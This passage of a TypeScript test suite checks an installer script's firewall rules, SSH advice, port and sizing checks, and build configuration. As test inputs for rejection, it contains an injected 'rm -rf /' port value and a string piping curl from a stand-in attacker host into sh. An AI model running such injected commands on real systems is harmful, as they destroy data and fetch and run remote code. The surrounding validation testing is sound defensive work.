  expect(rules.length).toBeGreaterThan(4)
  for (const rule of rules) {
    const r = spawnSync('sh', ['-c', `${helpers}\nrule_ok ${JSON.stringify(rule)}`], { encoding: 'utf8' })
    expect(r.status, rule).toBe(0)
  }
})

test('a renderer that dies aborts the install instead of reporting success', () => {
  // `fw_ufw | run_rules` ran the renderer in a SUBSHELL: a `die` there exited the subshell, the
  // pipeline's status was `run_rules` succeeding, and with no `pipefail` the script carried on
  // and reported a successful install. The second layer was theatre.
  const helpers = shellHelpers()
  expect(helpers).toContain('apply_rules()')
  const dying = spawnSync('sh', ['-c', `set -eu\n${helpers}\nbad() { die 'rendering failed'; }\napply_rules bad\necho REACHED`], { encoding: 'utf8' })
  expect(dying.status).toBe(1)
  expect(dying.stdout).not.toContain('REACHED')
  expect(dying.stderr).toMatch(/rendering failed|could not render/)
})

test('a lane port or range that is not one is refused before any rule is written', () => {
  // `run_rules` EVALS what these renderers produce. Their input was script-internal until the
  // rules started following the resolved values; a lane port is operator input now.
  for (const bad of ['0', '70000', 'abc', '5432; rm -rf /']) {
    const r = tryRun(['--print-firewall'], { INSTA_OSS_LANE_PG_PORT: bad })
    expect(r.status, bad).toBe(1)
    expect(r.stderr, bad).toContain('INSTA_OSS_LANE_PG_PORT')
  }
  for (const bad of ['20000', '30000-', 'a-b', '30099-30000']) {
    const r = tryRun(['--print-firewall'], { INSTA_OSS_LANE_PORT_RANGE: bad })
    expect(r.status, bad).toBe(1)
    expect(r.stderr, bad).toContain('INSTA_OSS_LANE_PORT_RANGE')
  }
})

test('the ssh advisory names every port sshd listens on, before the enable', () => {
  // The advisory is the only place SSH is mentioned, and it is advice, not a rule. Every test
  // here injects the detection, so none of them reads the HOST's sshd or ufw: the previous
  // version asserted against whatever the machine running the suite happened to have, which
  // fails on exactly the hardened boxes this advice is for.
  const moved = run(['--print-ssh-advice'], { IO_SSH_PORTS: '2222' })
  expect(moved).toContain('ufw allow 2222/tcp')
  expect(moved).not.toContain('OpenSSH')
  // EVERY detected port, not the first: a box listening on two loses the one that is dropped.
  const both = run(['--print-ssh-advice'], { IO_SSH_PORTS: '22, 2222' })
  expect(both).toContain('ufw allow 22/tcp')
  expect(both).toContain('ufw allow 2222/tcp')
  // Each of them BEFORE the enable, which is the whole point of the ordering.
  expect(both.indexOf('ufw allow 2222/tcp')).toBeLessThan(both.indexOf('ufw enable'))
  // Nothing detected: nothing assumed. The app profile, and the substitution spelled out.
  const none = run(['--print-ssh-advice'], { IO_SSH_PORTS: ' ' })
  expect(none).toMatch(/ufw allow OpenSSH\s+# or your own SSH port/)
  expect(none.indexOf('OpenSSH')).toBeLessThan(none.indexOf('ufw enable'))
  // SOCKET ACTIVATION, the Ubuntu 24.04 default and the case a fallback chain gets wrong: the
  // documented way to move SSH is `systemctl edit ssh.socket` with ListenStream=2222, which
  // leaves sshd_config at `#Port 22`, so `sshd -T` says 22 and the socket says 2222. Both are
  // printed and the disagreement is stated rather than one of them being asserted.
  expect(both).toMatch(/sshd config and the socket unit report DIFFERENT ports/)
  expect(moved).not.toMatch(/DIFFERENT ports/)
  // ...and the detection really does read all three sources, the socket unit among them.
  expect(script).toMatch(/systemctl show ssh\.socket sshd\.socket --value -p Listen/)
  expect(script).toMatch(/sshd -T/)
  expect(script).toMatch(/ss -tlnpH/)
  // And the arm that prints it says whose job SSH is.
  expect(script).toMatch(/this script adds no SSH rule/)
  expect(script).toMatch(/ssh_advice \| while read/)
})

test('the run path: every port the daemon binds is refused, readiness on /healthz, the final lines', () => {
  // The router binds all three fixed lanes at startup and exits when one is taken, so a busy lane
  // port is a refusal that names the key that moves it, never a warning followed by a healthz
  // timeout. 3306 is not checked: server-mode MySQL takes a port out of the lane range.
  expect(script).toContain('need_port 80 ')
  expect(script).toContain('need_port 443 ')
  expect(script).toContain('need_port "$PORT" ')
  expect(script).toContain('need_port "$INTERNAL_PORT" ')
  expect(script).toContain('need_port "$LANE_PG" ')
  expect(script).toContain('need_port "$LANE_REDIS" ')
  expect(script).toContain('need_port "$LANE_MONGO" ')
  expect(script).toContain('INSTA_OSS_LANE_REDIS_PORT to another port')
  expect(script).not.toContain('for _p in 6379 3306 27017; do')
  expect(script).toContain('[ "$PORTS_BUSY" = 0 ] || die')
  // the lanes are checked where they are configured, not where they default to, and the same
  // resolved value reaches the firewall rules (see the rule test above)
  expect(script).toContain('LANE_PG=$(lane_port INSTA_OSS_LANE_PG_PORT 5432)')
  expect(script).toContain('emit INSTA_OSS_LANE_REDIS_PORT "$LANE_REDIS"')
  expect(script).toContain('curl -fsSL https://get.docker.com | sh')
  expect(script).toContain('docker compose version')
  expect(script).toContain('up -d --remove-orphans')
  expect(script).toMatch(/"http:\/\/127\.0\.0\.1:\$PORT\/healthz"/)
  for (const line of [
    "log 'InstaCloud is running.'",
    'log "  Setup:    https://console.$DOMAIN/setup"',
    'log "  API:      https://api.$DOMAIN"',
    'log "  CLI:      insta login --api-key <token from the setup page> --api-url https://api.$DOMAIN"',
    'log "  Config $CFG   Data $DATA   Reflinks: $REFLINK"',
    "log 'Re-run this script to upgrade (add --version vX.Y.Z to pin).'",
  ]) expect(script).toContain(line)
  // --tls internal: the edge's root is copied where curl --cacert, PGSSLROOTCERT and NODE_EXTRA_CA_CERTS can use it
  expect(script).toContain('caddy/data/caddy/pki/authorities/local/root.crt')
  expect(script).toContain('"$DATA/edge/ca.pem"')
})

test('Dockerfile, .dockerignore, package.json and the workflows agree with the installer', () => {
  const dockerfile = readFileSync(join(ROOT, 'Dockerfile'), 'utf8')
  expect(dockerfile).toContain('INSTA_OSS_MODE=server')
  expect(dockerfile).toContain('INSTA_OSS_TEMPLATES_DIR=/app/templates')
  expect(dockerfile).toContain('INSTA_OSS_UI_DIST=/app/ui/dist')
  expect(dockerfile).toContain('COPY templates ./templates')
  expect(dockerfile).toContain('COPY --from=ui /app/ui/dist ./ui/dist')
  expect(dockerfile).toContain('COPY --from=dockercli /usr/local/bin/docker /usr/local/bin/docker')
  expect(dockerfile).toContain('CMD ["node", "node_modules/tsx/dist/cli.mjs", "src/main.ts"]')
  expect(dockerfile).toMatch(/^ARG NODE_IMAGE=node:22\.\d+\.\d+-bookworm-slim$/m)   // exact multi-arch pins
  expect(dockerfile).toMatch(/^FROM docker:28\.\d+\.\d+-cli AS dockercli$/m)
  expect(dockerfile).toMatch(/HEALTHCHECK[\s\S]*headers:\{host:'api\.'/)               // the router dispatches by Host (decision 4)
  const ignore = readFileSync(join(ROOT, '.dockerignore'), 'utf8').split('\n')
  for (const p of ['node_modules', 'ui/node_modules', 'ui/dist', 'templates/node_modules', '.git', 'test', 'docs', 'plans']) expect(ignore).toContain(p)
  // tsx is the runtime inside the image, so it is a dependency, not a dev one
  const pkg = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')) as { version: string; scripts: Record<string, string>; dependencies: Record<string, string>; devDependencies: Record<string, string> }
  expect(pkg.dependencies.tsx).toBeDefined()
  expect(pkg.devDependencies.tsx).toBeUndefined()
  expect(pkg.scripts.start).toBe('tsx src/main.ts')
  expect(pkg.scripts['build:image']).toContain('docker build')
  expect(pkg.version).toMatch(/^\d+\.\d+\.\d+/)                                        // release source of truth
  const release = readFileSync(join(ROOT, '.github', 'workflows', 'release-image.yml'), 'utf8')
  expect(release).toContain("tags: ['v*']")
  expect(release).toContain('images: ghcr.io/insforge/instacloud')
  expect(release).toContain('platforms: linux/amd64,linux/arm64')
  expect(release).toContain('require(\'./package.json\').version')                      // tag must equal v<package.json version>
  const ci = readFileSync(join(ROOT, '.github', 'workflows', 'ci.yml'), 'utf8')
  const tail = ci.slice(ci.indexOf('# ---- WP6 ----'))
  expect(tail).toContain('shellcheck -s sh install.sh')
  expect(tail).toContain('docker build --build-arg VERSION=ci -t instacloud:ci .')
})

// `run_rules` evals each rendered firewall line as root, and those lines interpolate the address
// pool bases read out of /etc/docker/daemon.json, a file this script does not own. The two helpers
// below are the gate. They are sliced out of the shipped script rather than restated, so the test
// cannot drift away from what actually runs.
const cidrHelpers = (): string => {
  const start = script.indexOf('valid_cidr() {')
  const end = script.indexOf('POOL_BASES=$POOL_BASE_DEFAULT', start)
  expect(start, 'valid_cidr is gone from install.sh').toBeGreaterThan(0)
  expect(end).toBeGreaterThan(start)
  return `warn() { printf 'warning: %s\\n' "$*" >&2; }\n${shapedHelper()}${script.slice(start, end)}`
}

/** `shaped` and its NL, sliced out of the script: every shape check in the installer goes
 *  through it, so a helper lifted out of the file needs it to run at all. */
const shapedHelper = (): string => {
  const start = script.indexOf("NL='")
  const end = script.indexOf('valid_ip() ', start)
  expect(start, 'the newline guard is gone from install.sh').toBeGreaterThan(0)
  expect(end).toBeGreaterThan(start)
  return script.slice(start, end)
}

test('only a CIDR block survives into the firewall lines the installer evals', () => {
  const keep = (input: string) =>
    spawnSync('sh', ['-c', `${cidrHelpers()}\nkeep_cidrs "$1"`, 'sh', input], { encoding: 'utf8' })

  expect(keep('10.100.0.0/14 172.16.0.0/12').stdout).toBe('10.100.0.0/14 172.16.0.0/12')
  // A base carrying shell metacharacters is dropped, loudly, and never reaches the eval.
  const hostile = keep('10.100.0.0/14 ;curl http://attacker.test|sh; $(id) `id`')
  expect(hostile.stdout).toBe('10.100.0.0/14')
  expect(hostile.stderr).toContain('not a CIDR block')
  expect(hostile.stdout).not.toContain('curl')
  // A bare address with no prefix length, and a name, are not CIDR blocks either.
  expect(keep('10.100.0.0 fd00::/8 example.test').stdout).toBe('')
})

// The documented minimums (2 vCPU, 2 GiB RAM, 15 GiB free) used to be enforced nowhere except the
// loop-image path, so an undersized box installed cleanly and failed later on an error that said
// nothing about sizing. The two readings behind the check are sliced out of the shipped script and
// run here, so the test cannot drift away from what the installer actually measures.
const sizingHelpers = (): string => {
  const start = script.indexOf('MEM_FLOOR_MIB=')
  const end = script.indexOf('check_resources() {', start)
  expect(start, 'the sizing check is gone from install.sh').toBeGreaterThan(0)
  expect(end).toBeGreaterThan(start)
  return script.slice(start, end)
}

test('the sizing check reads MemTotal and the free space of the filesystem that will hold the data', () => {
  const sh = (body: string, ...args: string[]) =>
    spawnSync('sh', ['-c', `${sizingHelpers()}\n${body}`, 'sh', ...args], { encoding: 'utf8' })

  const dir = mkdtempSync(join(tmpdir(), 'insta-sizing-'))
  // A box sold as 2 GiB reports a little under it, so the floor has to sit below 2048 MiB or every
  // documented-minimum machine would be refused. This is the MemTotal of a real 2 GiB cloud host.
  const twoGiB = join(dir, 'meminfo-2g')
  writeFileSync(twoGiB, 'MemTotal:        2007268 kB\nMemFree:          123456 kB\n')
  const mem2 = sh('mem_total_mib "$1"', twoGiB)
  expect(mem2.status).toBe(0)
  expect(Number(mem2.stdout.trim())).toBe(1960)
  expect(Number(mem2.stdout.trim())).toBeGreaterThanOrEqual(1900)   // passes the floor

  const oneGiB = join(dir, 'meminfo-1g')
  writeFileSync(oneGiB, 'MemTotal:        1010420 kB\n')
  expect(Number(sh('mem_total_mib "$1"', oneGiB).stdout.trim())).toBeLessThan(1900)   // refused

  // No MemTotal line, and no file at all: the reading fails rather than reporting 0, which is what
  // makes the caller skip the check instead of refusing the install.
  const empty = join(dir, 'meminfo-empty')
  writeFileSync(empty, 'SwapTotal: 0 kB\n')
  expect(sh('mem_total_mib "$1"', empty).status).not.toBe(0)
  expect(sh('mem_total_mib "$1"', join(dir, 'absent')).status).not.toBe(0)

  // free_gib walks up to the nearest existing ancestor, because the data directory is measured
  // before it is created: /var/lib/instacloud has to report /var/lib on a first install.
  const here = sh('free_gib "$1"', dir).stdout.trim()
  expect(here).toMatch(/^\d+$/)
  expect(sh('free_gib "$1"', join(dir, 'not', 'yet', 'there')).stdout.trim()).toBe(here)

  rmSync(dir, { recursive: true, force: true })
})

test('an undersized box is refused on a first install and only warned about on an upgrade', () => {
  // Not gated on STACK_UP the way the port check is: the ports are held by our own stack on a
  // re-run, memory and disk are not.
  expect(script).toContain('\ncheck_resources\n')
  expect(script).toMatch(/MEM_FLOOR_MIB=1900\nDISK_FLOOR_GIB=15\n/)
  const body = script.slice(script.indexOf('check_resources() {'), script.indexOf('\ncheck_resources\n'))
  expect(body).toContain('_mem=$(mem_total_mib)')
  expect(body).toContain('_free=$(free_gib "$DATA")')
  expect(body).toContain('if [ "$UPGRADE" = 1 ]; then')
  expect(body).toMatch(/UPGRADE" = 1 \]; then\n {4}warn /)     // an upgrade continues
  expect(body).toContain('die "this box is under the documented minimum')
  // one core runs, slowly: that one is a warning at every point, never a refusal
  expect(body).toMatch(/_cpu" -lt 2 \]; then warn /)
  // and the header the operator reads says the same numbers the code enforces
  expect(script).toContain('2 vCPU, 2 GiB RAM, 15 GiB free disk')
})
